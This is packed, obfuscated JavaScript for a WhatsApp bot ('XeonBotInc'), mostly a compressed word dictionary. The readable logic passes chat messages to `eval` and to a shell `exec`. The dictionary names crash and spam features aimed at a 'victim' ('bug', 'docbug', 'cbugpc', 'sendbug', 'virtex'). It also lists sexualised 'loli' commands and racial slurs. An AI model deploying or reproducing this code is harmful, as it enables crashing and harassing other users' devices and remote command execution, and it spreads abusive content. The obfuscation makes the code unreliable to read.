${j}jk🔖• ${j}jj🔖• ${j}ji🔖• ${j}jh🔖• ${j}jg🔖• ${j}jf🔖• ${j}je🔖• ${j}jd🔖• ${j}jc🔖• ${j}jb🔖• ${j}ja🔖• ${j}j9🔖• ${j}j8🔖• ${j}j7🔖• ${j}j6🔖• ${j}j5🔖• ${j}j4🔖• ${j}j3🔖• ${j}j2🔖• ${j}j1🔖• ${j}j0👨??‍💻• ${j}iZ👨??‍💻• ${j}iY🔖• ${j}iX🔖• ${j}iW🔖• ${j}iV🔖• ${j}iU🔖• ${j}iT🔖• ${j}iS🔖• ${j}iR🔖• ${j}iQ🔖• ${j}iP🔖• ${j}iO🔖• ${j}iN🔖• ${j}iM🔖• ${j}iL🔖• ${j}iK🔖• ${j}iJ🔖• ${j}iI🔖• ${j}iH🔖• ${j}iG🔖• ${j}iF🔖• ${j}iE??• ${j}iD🔖• ${j}iC🔖• ${j}iB??• ${j}iA🔖• ${j}iz🔖• ${j}iy🔖• ${j}ix🔖• ${j}iw🔖• ${j}iv🔖• ${j}iu🔖• ${j}ir🔖• ${j}iq🔖• ${j}il🔖• ${j}ik🔖• ${j}ij🔖• ${j}ii🔖• ${j}ih🔖• ${j}ig🔖• ${j}ie🔖• ${j}ic🔖• ${j}ib🔖• ${j}ia🔖• ${j}i9🔖• ${j}i8🔖• ${j}i7🔖• ${j}i6🔖• ${j}i5🔖• ${j}i4🔖• ${j}i3🔖• ${j}i2🔖• ${j}i1🔖• ${j}i0🔖• ${j}hZ🔖• ${j}hY🔖• ${j}hX🔖• ${j}hW🔖• ${j}hV🔖• ${j}hU🔖• ${j}hT🔖• ${j}hS🔖• ${j}hR🔖• ${j}hQ🔖• ${j}hP🔖• ${j}hO🔖• ${j}hN🔖• ${j}hM🔖• ${j}hL`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'s3\':{1m 2O=F 3i(4s+\'aQ 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🦄s2🔖• ${j}aP🔖• ${j}7Q🔖• ${j}9O🔖• ${j}kQ🔖• ${j}4V[aO]🔖• ${j}9N[kP]🔖• ${j}kO[2X]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'s1\':{1m 2O=F 3i(4s+\'9M 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`👤s0🔖• ${j}3f🔖• ${j}6m🔖• ${j}9L🔖• ${j}aM`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'rZ\':{1m 2O=F 3i(4s+\'el 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`📂kN🔖• ${j}kM🔖• ${j}kL🔖• ${j}kK🔖• ${j}kJ🔖• ${j}kI🔖• ${j}cn🔖• ${j}ek🔖• ${j}kH`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'rY\':{1m 2O=F 3i(4s+\'kG 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🥷🏻rX🔖• ${j}kF🔖• ${j}id🔖• ${j}kE[1q]🔖• ${j}cm🔖• ${j}rW[D]🔖• ${j}kD🔖• ${j}ej[D]]🔖• ${j}kC🔖• ${j}3S🔖• ${j}kB🔖• ${j}kA🔖• ${j}2j🔖• ${j}5D🔖• ${j}2y🔖• ${j}kz🔖• ${j}H🔖• ${j}ky🔖• ${j}kx🔖• ${j}3w🔖• ${j}8B🔖• ${j}ei[kw]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'kv\':l\'ku\':l\'kt\':l\'ks\':l\'kr\':l\'kq\':l\'kp\':l\'ko\':l\'kn\':l\'km\':l\'kl\':l\'kk\':l\'kj\':l\'ki\':l\'kh\':l\'kg\':l\'kf\':l\'kd\':l\'kc\':l\'kb\':l\'ka\':l\'k9\':l\'k8\':l\'k7\':l\'k6\':l\'k5\':l\'k4\':l\'k3\':l\'k2\':l\'k1\':l\'k0\':l\'jZ\':l\'jY\':l\'jX\':l\'jW\':l\'jV\':l\'jU\':l\'jT\':l\'jS\':l\'jR\':l\'jQ\':l\'jP\':l\'jO\':l\'jN\':l\'jM\':l\'jL\':l\'jK\':l\'jJ\':l\'jI\':l\'jH\':l\'jG\':l\'jF\':l\'jE\':l\'jD\':l\'jC\':l\'jB\':l\'jA\':l\'jz\':l\'jy\':l\'jx\':l\'jw\':l\'jv\':l\'ju\':l\'jt\':l\'jr\':l\'jq\':l\'jp\':l\'jo\':l\'jn\':l\'jm\':l\'jl\':l\'jk\':l\'jj\':l\'ji\':l\'jh\':l\'jg\':l\'jf\':l\'je\':l\'jd\':l\'jc\':l\'jb\':l\'ja\':l\'j9\':l\'j8\':l\'j7\':l\'j6\':l\'j5\':l\'j4\':l\'j3\':l\'j2\':l\'j1\':l\'j0\':l\'iZ\':l\'iY\':l\'iX\':l\'iW\':l\'iV\':l\'iU\':l\'iT\':l\'iS\':l\'iR\':l\'iQ\':l\'iP\':l\'iO\':l\'iN\':l\'iM\':l\'iL\':l\'iK\':l\'iJ\':l\'iI\':l\'iH\':l\'iG\':l\'iF\':l\'iE\':l\'iD\':l\'iC\':l\'iB\':l\'iA\':l\'iz\':l\'iy\':l\'ix\':l\'iw\':l\'iv\':l\'iu\':l\'ir\':l\'iq\':l\'il\':l\'ik\':l\'ij\':l\'ii\':l\'ih\':l\'ig\':l\'ie\':l\'ic\':l\'ib\':l\'ia\':l\'i9\':l\'i8\':l\'i7\':l\'i6\':l\'i5\':l\'i4\':l\'i3\':l\'i2\':l\'i1\':l\'i0\':l\'hZ\':l\'hY\':l\'hX\':l\'hW\':l\'hV\':l\'hU\':l\'hT\':l\'hS\':l\'hR\':l\'hQ\':l\'hP\':l\'hO\':l\'hN\':l\'hM\':l\'hL\':rV=F 3i(`S:F C.N(m.E,{2H:rV,3C:\'2H/6q\',cl:2l},{H:m})G Br:if(2S.6o(\'=>\')){if(!2b)L m.z(J.2j)8A Bq(hI){hJ=4L.6Q(hI,hK,2)hH=5C.5g(hJ)if(hJ==hE){hH=5C.5g(hI)}L m.z(hH)}6p{m.z(5C.5g(rU(`(4A()=>{L ${2S.6n(3)}})()`)))}1j(e){m.z(hG(e))}}if(2S.6o(\'>\')){if(!2b)L m.z(J.2j)6p{B ck=F rU(2S.6n(2))if(aN ck!==\'rT\')ck=1P(\'5C\').Bp(ck)F m.z(ck)}1j(P){F m.z(hG(P))}}if(2S.6o(\'$\')){if(!2b)L m.z(J.2j)6P(2S.6n(2),(P,7P)=>{if(P)L m.z(P)if(7P)L m.z(7P)})}if(m.E.eh(\'@s.2d.2q\')&&5W){1o.3f=1o.3f?1o.3f:{}B 1x=3R.5Z(1o.3f).4U(1x=>[1x.a,1x.b].2i(m.1l)&&1x.5Y===\'hF\')if(1x){if(/^.*(9L|aM|6m)/.1t(m.D))L if([\'.9L\',\'.aM\',\'.rS\',\'.6m\',\'Bo 8z\',\'Bn\',\'Bm\',\'8y\'].2i(m.D))L B 5X=[1x.a,1x.b].4U(2f=>2f!==m.1l)m.ee(5X,2l,m.H&&m.H.3B?{2Q:{...m.2K.2Q,rR:0,rQ:2l,4K:5X}}:{})}L!0}if(5W&&2S.3c()!=hE){if(m.E.eh(\'5V\'))L if(m.ef)L B 5U=W.db.M.4p if(!(2S.3c()in 5U))L C.ee(m.E,5U[2S.3c()],2l)}}}1j(P){m.z(5C.5g(P))}}B aL=1P.Bl(rP)fs.Bk(aL,()=>{fs.Bj(aL)1z.1B(5B.Bi(`Bh ${rP}`))2y 1P.Bg[aL]1P(aL)})',62,3479,'|||||||||||||||||||prefix||case||||||||||||||reply||let|XeonBotInc|text|chat|await|break|quoted||mess|command|return|data|sendMessage||err|throw|url|https||image|type|global||caption|textpro|||||||||||you|botname|buttons|const|buttonText|displayText|buttonId|split|wait|catch|from|sender|var|the|this|html|link|anu|args|test|then|group|effect|room|else|console|off|log|Math|online|result|length|headerType|themeemoji|Here|footer|Use|Made|waifudd|isGroup|maker|require|roof|buttonMessage|media|create|for|random|message|The|teks|false|||||||||||sendButtonText|isCreator|res|whatsapp|title|user|game|your|includes|owner|get|true|name|key|Example|Next|net|admin|kice|join|author|floor|Error|bvl|delete|Menu|query|mentionedJid|emoji|axios|vote|send|isAdmins|audio|jsonformat|More|msg|map|isBotAdmins|packname|unicorn|jawaban|contextInfo|sticker|budy|autosticker|mems|video|and|tag|mime|free|||||||||||Reply|buffer|toLowerCase||push|anonymous|who|botAdmin|getBuffer|unlinkSync|lib|aud|replace|Already|What|Detected|Owner|description|antilink|status|wbuttsss|Link|donate|Image|mentions|com|sendText|fromMe|mimetype|Features|readFileSync|Success|has|fetchJson|members|ever|rowId|List|users|with|kicked|have|suit|Object|script|Please|Send|participants|encmedia|turning|adm|groupe|||||||||||cpu|Script|Enter|below|You|_|chats|img|With|json|button|any|jawab|Caption|hasOwnProperty|database|sendMsg|Donate|picak|can|Displays|new|last|been|are|Answer|async|Message|activated|not|Video|teks2|teks1|Guess|Months|Days|participant|JSON|groupMetadata|remove|wifegerak|disable|buttonsntilink|nAnswer|groupParticipantsUpdate|setting|find|guess|extendedTextMessage|success|splice|person|||||||||||Title|logo|style|remoteJid|setbot|times|format|play|XeonMedia|ownernya|enable|indexOf|deactivated|member|that|trim|sent|wallpaper|neon|thumb|ments|downloadAndSaveMediaMessage|still|set|hash|mute|others|chalk|util|menu|what|song|glitch|Group|fileName|sendImageAsSticker|raw|click|Off|will|filter|emote|Url|Has|nWant|because|msgs|broadcast|isCmd|other|state|values|||||||||||nsfw|body|list|ownername|nExample|writeFileSync|text2|error|githubusercontent|youtube|like|jpegThumbnail|start|slice|startsWith|try|mp4|txt|pinterest|tiktok|toxic|text1|buff|wifegerakx|ano|nOff|nOn|Warning|most|here|say|voice|messages|max|Audio|pilih|botNumber|Successfully|answer|afkTime|00|exec|stringify|waifu|halloween|thumbnail|document|speed|fileSha256|bot|imageMessage|jpg|||||||||||picture|immediately|was|love|Have|seconds|Media|download|hehehe|Date|tebakgambar|tebaklagu|sending|nAdmin|quality|graffiti|devote|choose|Button|100|read|don|crush|Who|make|put|note|api|search|baby1|arr|index|sleep|kah|kuismath|caklontong|tebaklirik|tebakkata|family100|str|win|stdout|dare|naruto|Convert|blackpink|christmas|upvote|pushname|keys|all|XBug|||||||||||requestPaymentMessage|VOTE|value|main|one|bad|nIf|now|moment|jodoh|AntiNsfw|result912|webp|mpeg|Want|templateGif|templateVideo|templateImage|question|tebakkalimat|pilih2|Play|kuis|mtype|Stop|Partner|function|request|google|yts|watercolor|multicolor|thunder|sand|react|number|Chat|theme|Below|num|order|getRandom|TelegraPh|base64|ntilinkig|thing|reason|boy|want|write|girl|call|||||||||||Query|rname|mp3|capt|From|isUrl|nama|logo9|logo4|inilogo9|inilogo4|light|ran|Template|check|press|Press|Time|voting|teks_vote|Total|Ask|sessions|unfinished|There|60000|terjawab|afkReason|stage2|stage|isWin|isSurrender|Wrong|Again|nCorrect|mediac|videoMessage|next|Anonymous|math|tictactoe|how|dance|happy|slap|yaoi|volume|lyrics|sketch|cool|dropwater|joker|transformer|underwater|rock|lava|skeleton|public|limit|isPremium|runtime|ucapanWaktu|sound|doc|mem|Xeon|would||grup|someone|time|word|5hrs|him|||photo|Good|scraper|pickRandom|||waktu|generator|templateMsg|cpus|parse|metadata|deletevote|votes|nTime|soal|Word|_family100|chatModify|parseMention|xtype|mek|time2|file|leave|typeof|option|truth|Game|when|neko|Sticker|Anime|animesmug|animemegumin|animeawoo|animeneko|Random|port|wikimedia|Search|repo|ytmp4|ytmp3|wonderful|pencil|magma|leaves|glue|blood||matrix||||kick|All|websitex|Bot|uptime|process|userJid|proto|jumlah|tes|rashidsiregar28|nttoxic|ntilinkall|twitter|ntilinktwt|ntilinktt|facebook||ntilinkfb|instagram|ntilinkytch|ntilinkytvid|_autostick|auto|ntvirtex|people|friend|partner|through|without|change|saying|wbutsss|but|wall|webp2mp4File|stderr|ffmpeg|Author|content|Name|paper|black|effects|akhji|pjtxt|settings|total|keluar|WAITING|For|locked|asetrate|atempo|store|sendTextWithMentions|1000|Can|caklontong_desk|60s|isSurender|anjh|tos|listResponseMessage|buttonsResponseMessage|evaled|ptt|repeat|listmsg|||lesbian|hot|hneko|loli|shinobu|microsoftemoji|reverse|deep|styletext|take|ringtone|film|zippyshare|soundcloud|mediafire|classic|writing|foggy|juice|1917|strawberry|natural|neonlight|wolf|bear|lion|pornhub|window|neondevil|papercut|demon|circuit|spooky|snow|ice|honey|firework|wicker|chocolate|wood|biscuit|berry|fiction|horror|candy|antitoxic|antivirus||editinfo|YouTube|rows|toFixed|ownernomer|relayMessage|enc|xeonbut2|fromObject|generateWAMessageFromContent|optionName|quotedMessage||isQuotedImage|setTimeout|qrcode|antiToxic|words|AntiLinkTwitter|telegram|AntiLinkTelegram|channel|had|parents|why|made|liked|tell|used|girlfriend|hours|using|Tag|images|close|filename|Type|Not|File|art|Done|MP3|setmenu|Info|Session|Cannot|toString|sin|Kolkata|Asia|pushName|ntnsfw|Reason|HAHAHA|following|playerO|Win|tie|reg|limitUser|||templateButtonReplyMessage|conversation|copyNForward|isBaileys||endsWith|report|fliptext|getmsg|Database|Sound|nibbi|nibba|horny|dog|nerd|bastard|idiot|sexy||trap||gura|nom|kiss|cry|STICKER|ANIME|animestick|ttp|removebg|IMG|coffee|slow|robot|nightcore|fat|fast|earrape|blown|bass|stick|gif|mcpedl|servermc|happymod|gimage|SEARCH|gitclone|Download|marvel|batman|hoorror|fabric|ancient|discovery|carbon|holographic|bokeh|glitch3|graffitibike|3dstone2|3dchristmas|sparklechristmas|metallic|waterpipe|brokenglass|harrypotter||bloodglas|darkgold|fruitjuice|scifi|deepsea|demote|promote|antilinkgc|add||unblock|block|setbio|sections|fkontak|sourceUrl|externalAdReply|messageId|application|nAmount|jpeg|AntiLinkTiktok|ntilinktg|AntiLinkFacebook|AntiLinkInstagram|AntiLinkYoutubeChannel|AntiLinkYoutubeVid|autostickpc|isAutoStick|ntype|isAutoSticker|antiVirtex|biggest|school|year|boyfriend|which|sing|apa|after|her|front|shout|out|titar|possessed|Someone|tik|sfw|hentai|Source|sendImage|pages|looking|buf||jadie|uploader||sendVideoAsSticker|timeout||Vote|xeontod|linkm|match|medias||Size|Limit|Over|ajg|cut|1044|rainbow|1030|cloud|mascot|Text|teds|green|satu|timestamp|mq1|mon|webpToMp4|toAudio|Change|formatp|performance|Found|romeo|session|Groups|Used|Hash|reactionMessage|unread|Before|Mode|open|groupSettingUpdate|DEVOTE|UPVOTE|menvote|concat|wasVote|isVote|Invalid|Years|Out|deskripsi|games|master|BochilTeam|sentence|archive|ibb||TicTacToe|give|currentTurn|playerX||jid|opponent|isTie|_currentTurn|winner|tebaktebakan|EmojiAPI|xeonbugpic|Bad|Wa|autobio|limitawal||isNumber||selectedRowId|singleSelectReply|selectedButtonId|Liye|Karne|Store|undefined|CHATTING|String|bang|sul|sat|null|sound161|sound160|sound159|sound158|sound157|sound156|sound155|sound154|sound153|sound152|sound151|sound150|sound149|sound148|sound147|sound146|sound145|sound144|sound143|sound142|sound141|sound140|sound139|sound138|sound137|sound136|sound135|sound134||sound133||sound132|sound131|sound130|sound129|sound128|sound127|||||sound126|sound125|||sound124|sound123|sound122|sound121|sound120|sound119|sound118|sound117|sound116|sound115|sound114|sound113|sound112|sound111|sound110|sound109|sound108|sound107|sound106|sound105|sound104|sound103|sound102|sound101|sound100|sound99|sound98|sound97|sound96|sound95|sound94|sound93|sound92|sound91|sound90|sound89|sound88|sound87|sound86|sound85|sound84|sound83|sound82|sound81|sound80|sound79|sound78|sound77|sound76|sound75|sound74|sound73|sound72|sound71|sound70|sound69|sound68|sound67|sound66|sound65||sound64|sound63|sound62|sound61|sound60|sound59|sound58|sound57|sound56|sound55|sound54|sound53|sound52|sound51|sound50|sound49|sound48|sound47|sound46|sound45|sound44|sound43|sound42|sound41|sound40|sound39|sound38|sound37|sound36|sound35|sound34|sound33|sound32|sound31|sound30|sound29|sound28|sound27|sound26|sound25|sound24|sound23|sound22|sound21|sound20|sound19|sound18||sound17|sound16|sound15|sound14|sound13|sound12|sound11|sound10|sound9|sound8|sound7|sound6|sound5|sound4|sound3|sound2|sound1|bug|listgc|listpc|chatinfo|ping|speedtest|alive|toviewonce|toqr|afk|Other|delmsg|addmsg|lockcmd|delcmd|listcmd|setcmd|DATABASE|suitpvp|mode|delttt|playgirl|fuckgirl|playboy|fuckboy|sucker|motherfucker|crackhead|dumbass|lit|gucci|dope|ditch|scoundrel|fagot|nuts|scumbag|rascal|mumu|comrade|noobra|wibu|cunt|stubble|smart|gay|asshole|foolish|noob|pretty|cute|beautiful|handsome|kind|couple|lovelycheck|charactercheck|hornycheck|uglycheck|cutecheck||gaycheck|lesbiancheck|prettycheck|awesomecheck|beautifulcheck|rate|where|Fun|gasm|animespank|nwaifu|hentaivideo|cringe|poke|wink|kill|bite|glomp|handhold|highfive|wave|smile|blush|yeet|bonk|smug|pat|lick|awoo|hug|cuddle|bully||||lovesticker|doge|attp|emojimix|patrick|couplepp||animehandhold|||||animehighfive|animecringe|animedance|animehappy|animeglomp|animeblush||animewave|animesmile|animepoke|animewink|animebonk|animebully|animeyeet||animebite|animelick|animekill||animecry|animecuddle|animewlp|animekiss|animepat|animeslap|feed|gecg|tickle|avatar|8ball|goose|animenom|foxgirl|animewaifu|rize|mikasa|kurumi|kotori|kaguya|gremory|emilia|elaina|cosplay|chitoge|anna|asuna|animemenu||||||||upscaler|triggeredwebp|wanted|Effect|pediaemoji|googleemoji|whatsappemoji|twitteremoji|skypeemoji|joyemoji|samsungemoji|iphoneemoji|facebookemoji|instagramemoji|Emote|animewall2||animewall|wallcode|wallrandom||wallml|wallpubg|wallneon|lizard|meow|woof|squirrel|tinyurl|dbinary|ebinary|toaudio|tomp3|tovn|tourl|togif|tovideo|smeme|toimage|mcserver|wattpad||ytsearch|searchgc|tiktokaudio|halloweenfire|collwall|whitebear|sci_fi|neonlight2|blackpink2|thewall|dropwater2|greenneon|3dneon|3dspace|glitch2|summertime|3dstone|3davengers|lion2|waterdrop|3dbox|harrypot|textmaker|blackpinkneon|retro|Maker|||delvote||checkvote|antilinkall||antilinktwit|antilinkfb||antilinkig|antilinkytvid|antilinkytch|||antilinktt|antilinktg|autostickerpc|tagall|hidetag|menfess|resetgrouplink|setdesc|setname|setgcpp|ephemeral|grouplink|GROUP|setexif|setthumb|creategroup|hijack|leavegc|self|CHAT|allmenu|showAdAttribution|pageCount|fileLength|subject|ini_mark|Select|fileEncSha256|mediaKey|mmg|documentMessage|IDR|currencyCodeIso4217|upload|xpic||prepareWAMessageMedia|amount|Successful|pollCreation|GET|anoucement|xeonannou|proc|downloadMediaMessage||Cheems|isMedia|10000|_buff|ranJ|ranE|cheemspic|tph|AntiLinkAll|ntilink|quere|day|could|How|first|creator|worst|got|makes|life|sad||did|money|long|days|When|embarrassing|does|mom|only|wanna|snap|just|story|Open|drop|post|chuda|being|nName|sangeh|xeony|gan|megumin|pics|aesthetic|anime|source|UploadFileUgu|Where|Photo|Duration|atnm|pcknm|swn|portnya|iphost|qury|Description|judul|thum|log0|zip|fdoc|krl|xfar|resultkkk3|found|xm_za|pint|Member|git|regex1|DOWNLOADER|1011||metal|1025|potter|harry|sky|1001|creation|anui|glow|1027|impressive|872|metalic|fdl|360p|128kbps|umma|Ext|Channel|Sent|nFor|feature|converter|into|tts|padEnd|Usage|irq|idle|sys|nice|reduce|Start|LIST|44100|06|wokwol|Report|gclink|Active|Been|Antilink|Edit|Close||gimana|wherelol|lel||Your|Don|Dont|kapan|bisa|orang|sotoy|run|questions|Lyrics|Sentence|ter|reject|picaks|clockString|Suit|turn|yes|2022|xeonbrutal|anju|anji|Tiktok|won|nYou|messagesD|antiWame|premium|cron|object|ntwame|groupAdmins|359996400|shift|selectedId|afternoon|__filename|isForwarded|forwardingScore|stop|string|eval|x_tiktok|readmore|OTHER|othermenu|databasemenu|ANONYMOUS|anonymousmenu|GAME|gamemenu|soundmenu|mysoulmate|funmenu|NSFW|Nsfw|nsfwmenu|animestickermenu|stickermenu||EFFECT|imageeffectmenu|EMOTE|emotemenu|RANDOM|randomimagemenu|vid|stik|CONVERT|convertmenu|tvsearch||searchmenu|DOWNLOAD|downloadmenu||8bit|MAKER|makermenu|antiwame|groupmenu|setppbot|OWNER|ownermenu|listMessage|botscript|tqtt|Credit|Thanks|Searching|mediaUrl|mediaType|xeonezy|docs|xdate|xtime|Infinity|jumlahharian|jumlahcmd|Self|Public|latensie|timestampe|friends|And|family|mediaKeyTimestamp|t62|directPath|lodaChoos2|randiKaBaccha|stream|octet|lodaChoos|Spam|Bug|amount1000|waUploadToServer|messa|sir|Okay|sure|Second|10s|timer|spam|nUse|empty|deploy|FOR|poll|getName|writeExifStc||stickerMessage|isQuotedSticker|QrCode|Jimp||imgSuper|medi|png|qyuer|mukelu||buttonsnttoxic|use|allowed|AntiLink|activate|autostikerpc|autostiker|buttonsntvirtex|virus|viewOnce|flipe|xeontruth|_You|told|whom|ask|secret|veg|country|habit|achievements|remember|hurt|incident|Mention|stolen|feel|things|proud|cheated|too|likes|felt|anyone|while|peed|own|five|home||app|hate|rejected|father|same|xeondare|screenshot|papa|its||telling||challenge|||pic|xeon|says|contact|personal|baby|top|BEAUTIFUL|ARE|YOU|ugly|Say|pop|bestie|know|Tell|profile|page|fuck|quote|randi|please|example|miss|groups|Welcome|sange|taky|teng|sendMedia|hello|button1Messages|buttonzMessage|buttonsesMessage|buttonszzsx1220Messages|wbuttszz1220ss|buttonszzsx1219Messages|wbuttszz1219ss|buttonszzsx1218Messages|wbuttszz1218ss|buttonszzsx1217Messages|wbuttszz1217ss|buttonszzsx1216Messages|wbuttszz1216ss|buttonszzsx1215Messages|wbuttszz1215ss|buttonszzsx1214Messages|wbuttszz1214ss|buttonszzsx1213Messages|wbuttszz1213ss|buttonszzsx1212Messages|wbuttszz1212ss|buttonszzsx1211Messages|wbuttszz1211ss|buttonszzsx1210Messages|wbuttszz1210ss||buttonszzsx129Messages|wbuttszz129ss|buttonszzsx128Messages|wbuttszz128ss|buttonszzsx127Messages|wbuttszz127ss|buttonszzsx126Messages|wbuttszz126ss|buttonszzsx125Messages|wbuttszz125ss|buttonszzsx124Messages|wbuttszz124ss|buttonszzsx123Messages|wbuttszz123ss|buttonszzsx12Messages|wbuttszz12ss|buttonszzsxMessages|wbuttszzss|button1ssxMessages|wbutt1sss|buttonssxMessages|buttoxnssMessages|bxxuttonssMessages|buttonussMessages|buttonsTsMessages|xxbuttonssMessages|btutttonssMessages|buttonsosMessages|buttonssMessage|waifud|button112ssMessages|xx1button3Messages|xxhnekobot|button12ssMessages|button1ssMessages|buttonsssMessages|button4Messages|nwaifubot|button3Messages|hnekobot|button2Messages|trapbot|video_1|Views|category|Category|wal|walb||AnimeWallpaper|nCategory|scraperW||nyz3|nyz2|buttonssMessages|isQuotedVideo|isQuotedAudio|mese|memek||meme|mee|Seconds|Maximum|gifee|bab|divote|dibaca|Read|date|Server|linkyke|Quality|Film|buffers|hek|writeExifImg|txtzh|nImporting|kidnapping|_amount_|1234567890|github|result4|size|999|mediafireDl|1037|bit|977|861|fruit|1016|1010|1047|1015|990|940|fire|1017|1049|calligraphy|color|1050|sci|1054|merry|sparkles|901|914|986|realistic|gold|luxury|1013|steel|1004|884|1012|white|Wait|thiccysapi|931|galaxy|summer|934|1028|938|space|983|tok|1031|stone|1014|wings|devil|1035|1022|glass|setStatus|cap|downloader|tiktokmp3|nih|Like|dengan|fgclink|jwbn|gcsearch|Couple|Resolution|filesizeF|dl_link|100000|filesize|ytv|y2mate|yta|ago|Upload|views|videoId|videos|Google|nTo|kafloc|kawk|MESSAGE|locationMessage|gifPlayback|Webp|toPTT|VN|That|fvn|tags|categories|results|emoji2|emoji1|Set|Choose|templateMessage|Gif|promisify|child_process|Speed|respon|MHZ|model||CPU|Core|totalmem|neww|oldd|latensi|Changing|Skip|Left|deleted|listed|getContentType|seplit|isi|entries|src|fakeObj|Missing|SHA256|permission|smooth|hypot|filter_complex|width|dBinary|binary|eBinary|Online|YYYY|nTotal|getQuotedObj|n_If|THANKS|disappearingMessagesInChat|WA_DEFAULT_EPHEMERAL|Activated|Now|buttonsntnsfw|Opened|buttonMessageDevote|buttonsDevote|Voted|buttonMessageUpvote|buttonsUpvote|buttonMessageVote|buttonsVote|updateProfilePicture|updateBlockStatus|lowq|Really|Know|PATIENT|koh|Tomorrow|keh|menst|sloth|slot|SLOT|VIRTUAL|somtoy|genMath|modes|nDescription|fungames|DGXeon|tex|Array|hasil|pesan|spaces|answers|some|nThere|markRead|unarchive|unmute|674|08|Picsart|w46VQ8D|poin_lose|poin|accept|defeat|surrender|Room|render|PLAYING|documents|During|AFK|continue|mentionUser|Lost|asal|waktu_milih|clearTimeout|nNow|chosen_|_The|nWaiting|chosen|jwb2|jwb|scissors|nScissors|nPaper|nop|later|Position||ender|surr|Riddle|Blank|Picture|chatUpdate|areJidsSameUser|generateWAMessage|enter|dua|xezy||154916|Screenshot|txS3dDZ|thumbnailUrl|PHOTO|previewType|xeonyvideo|xeonyimage|xeonyaudio|xeonysticker|www|Telegram|Facebook|Instagram|YoutTube|speak|taught|Never||mouth|watch|Hey|isgclink|isLinkThisGc|detected|Auto|sendPresenceUpdate|dataa|hit|timezone|getGroupAdmins|groupName|sendEphemeral|VCARD|nitem1|916909137213|audioMessage|200|ordermessage|prefa|xeonbutton|xeonvirtex|morning|reader|Primbon|primbon||path|cache|Update|redBright|unwatchFile|watchFile|resolve|Lanjut|Keluar|Cari|inspect|Return|default|getpp|leveling|botgroups|SOUND|FUN|grousetting||Users|Fellow|Nsfe|Making|Logo|Main|Initial|1000000000|99999999999999|xlsx|cheems|platform|hostname|PREFIX|miliseconds|Assalamualaikum|help|panel|assemble|helped|1658703206|6303EB20|01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g|ccb|19245462_2210838589082189_6252828231656384414_n|7119|Q3HY|oFBEZHIeGsL|CnBDLUVshNEAmK8C4ShVaI99hh|V9yjh9s9t3Ox8a72o|SkHeALp42Ch7DGb6nuV6p7hxL|5JCeuQeRkm5NMpJWZG3hSuFU|TImW|47DEQpj8HBSa|JWLPPS|AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm|docbug|oneshot2|oneshot|WA|MODS|DEVELOPER|entered|nMake|916909|idGroup|Syntax|cbuggc|Sending|916909s|victim|cbugpc|BRO|BUG|THIS|thisbug|sendbug|selectableOptionsCount|NUMBER|FREE|MAX|PRO|IPHONE|WIN|AND|PLEASURE|options|pollCreationMessage|requested|Survey|sendPoll|Separate|polltes|snt|addannouncement|addanoucment|Halo|groupCreate|ext|stickerwm|swm|bitmap|decode|callback|jimp|readqr|imagenobg|output_url|Buffer|scale|toDataURL|include|animesticker|uses|nNobody|antilinktwitter|antilinktwt|antilinktiktok|antilinktelegram|antilinkfacebook|antilinkinsta|antilinkinstagram|antilinkyoutubechannel|antilinkyoutubech|antilinkyoutubevid|antilinkyoutubevideo|nNo|antivirtex|toonce|Flip|Normal|TEXT|FLIP||TRUTH_|pubg|dream|strangest|Whats|celebrity|lie|character|fictional|show|childhood|favorite|selfies|many||look|think|animal|regret|wishes|three|granted|genie|social|creeped|whois|kept|invisible|non|minister|prime|current|teacher|revenge|taking|thought|Ganteng|Dayat|big|together|lied|uncomfortable|important|fathers|mothers|steal|quietly|once|fear|honestly|during|nosetril|finger|sometimes|among|cried|done|exam|mistake|sleeping|bed|farts|smell|pants|hard|laughed|island|desert|stuck|bring|items|item|sick|faked|waste|phone|annoys|Which|dead|seen|ghosted|blamed|farted|happened|thats|scariest|week|lives|swap|Googled|watched|they|talents|hidden|called|Why|angry|really|were|experience|death|near|shower|ideal|closest|very|awesome|influential|feared|mistress|bro|sided|Ever|secretly|kamu|terbesar|ketakutan|different|maybe|outside|DARE_|proof|excepting|abusive|mommy|feeling|kalal|depak|marry|frnd|best|breakup|firmly|urself|harsh|face|bravooooooooo|world|ugliest|hardly|butt|5hours|GAY|pfp|actor|bollywood|notes|chatlist|pinlist|HANDSOME|bustard|Crush|london|oli|10mins|bitch|music|short|full|said|texted|Show|garlic|piece|Eat|5mins|twerk|saddest|sitting|Breakdance|anthem|national|knees|elbows|Walk|known||well|Let|paste|selfie|Take|howl|door|loud|book|Pick|chicken|Act|guys|LIE|DON|recent|suitable|bhoi|selmon|bengali|child|lucky|battery|according|back|come|prank|piche|age|record|tele|submit|chatted|sex|opposite|house|DONKEY|etc|refrigerator|grasshoppers|Pretending|version|language|gheto|rhyme|mention|ciyusss_|surgery|plastic|separated|twin|_I|noisy|scolded|until|table|Bang|wants|played|chorus||Millionaire|Wants|every||pickle|pause|spill|drink|dragging|dishes|side|rice|tablespoons|eat|Most|bal|khanki|boka|bewda|dogla|tharki|nigga|laund|loda|nigger|bhosdk|bsdk|bhosdika||behnchoda|behenchod|topibaa